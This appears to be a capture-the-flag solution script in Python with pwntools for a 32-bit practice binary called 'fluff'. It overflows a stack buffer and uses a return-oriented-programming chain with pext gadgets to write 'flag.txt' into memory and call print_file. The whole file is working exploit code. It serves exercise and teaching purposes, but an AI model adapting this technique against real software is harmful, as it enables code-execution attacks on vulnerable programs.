from pwn import *

context.bits = 32
elf = ELF("./fluff")

pext = p32(0x08048543)
ecriture = p32(0x08048555)
pop_ecx = p32(0x08048558)
pop_ebp = p32(0x080485bb)
section_data = 0x0804a018
print_file = p32(elf.plt["print_file"])

SRC = 0xb0bababa

def find_mask(target):
    mask, pos = 0, 0
    for out_bit in range(8):
        want = (target >> out_bit) & 1
        while pos < 32 and ((SRC >> pos) & 1) != want:
            pos += 1
        if pos >= 32:
            raise ValueError("aucun masque pour l'octet 0x%02x" % target)
        mask |= (1 << pos)
        pos += 1
    return mask

payload = b'A' * 44
for i, c in enumerate(b"flag.txt"):
    payload += pop_ebp + p32(find_mask(c))
    payload += pext
    payload += pop_ecx + p32(section_data + i, endian="big")
    payload += ecriture

payload += print_file
payload += p32(0xdeadbeef)
payload += p32(section_data)

p = process("./fluff")
p.send(payload)
print(p.recvall().decode('utf-8'))
